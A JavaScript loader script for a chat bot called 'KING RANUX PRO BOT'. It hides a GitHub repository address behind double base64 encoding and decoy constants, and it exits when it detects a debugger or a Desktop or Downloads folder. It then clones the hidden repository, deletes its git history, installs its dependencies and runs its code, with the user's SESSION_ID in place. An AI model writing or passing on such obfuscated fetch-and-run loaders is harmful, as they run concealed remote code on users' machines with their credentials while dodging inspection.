const { execSync } = require("child_process");
const fs = require("fs");
const path = require("path");

if (process.execArgv.join("").includes("inspect")) {
  console.log("❌ Debug mode detected. Exiting...");
  process.exit(1);
}

const FAKE_CORE_1 = "aHR0cHM6Ly9naXRodWIuY29tL2Zha2UvZmFrZS5naXQ=";
const FAKE_CORE_2 = "aHR0cHM6Ly9naXRodWIuY29tL2R1bW15L2R1bW15LmdpdA==";

function useless() {
  return Buffer.from(FAKE_CORE_1, "base64").toString();
}

function buildHiddenString() {
  const parts = [
    "YUhSMGNITTZMeTl1WVdo",
    "MGIyUjNiaTVqYjIwdm",
    "N5YnJpZGdlLWRldi9u",
    "eC1icmlkZ2UuZ2l0"
  ];
  return parts.join("");
}

const STEP1 = Buffer.from(buildHiddenString(), "base64").toString("utf-8");
const CORE_URL = Buffer.from(STEP1, "base64").toString("utf-8");

const CORE_DIR = path.join(__dirname, "core");

console.log(`
╔══════════════════════════════════════╗
║      👑 KING RANUX PRO BOT 👑        ║
║        Secure Core Loader            ║
╚══════════════════════════════════════╝
`);

if (__dirname.includes("Desktop") || __dirname.includes("Downloads")) {
  console.log("❌ Unauthorized environment detected.");
  process.exit(1);
}

try {
  console.log("🧹 Clearing npm cache...");
  execSync("npm cache clean --force", { stdio: "inherit" });
} catch {}

if (fs.existsSync(CORE_DIR)) {
  try {
    console.log("🗑 Removing old core...");
    fs.rmSync(CORE_DIR, { recursive: true, force: true });
  } catch {}
}

console.log("📦 Fetching latest core engine...");

try {
  execSync(`git clone ${CORE_URL} core`, { stdio: "inherit" });
  console.log("✅ Core downloaded successfully.");
} catch (e) {
  console.log("❌ Core download failed.");
  process.exit(1);
}

if (fs.existsSync(path.join(CORE_DIR, ".git"))) {
  try {
    fs.rmSync(path.join(CORE_DIR, ".git"), { recursive: true, force: true });
  } catch {}
}

console.log("📥 Installing core dependencies...");

try {
  execSync(`cd core && npm install`, { stdio: "inherit" });
  console.log("✅ Dependencies installed.");
} catch (e) {
  console.log("❌ Dependency installation failed.");
  process.exit(1);
}

const userConfigPath = path.join(__dirname, "config.js");

if (!fs.existsSync(userConfigPath)) {
  console.log("⚠️  config.js not found.");
  console.log("👉 Please create config.js with your SESSION_ID.");
  process.exit(1);
}

console.log("🔐 Loading user configuration...");
console.log("🚀 KING RANUX PRO IS NOW ONLINE");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("🤖 Bot Status : ACTIVE");
console.log("🔐 Mode       : SECURE CORE");
console.log("⚡ Engine     : rxbridge-dev / nx-bridge");
console.log("👑 Owner      : SESSION USER");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

try {
  require("./core/index.js");
} catch (e) {
  console.log("❌ Failed to start core:", e);
}
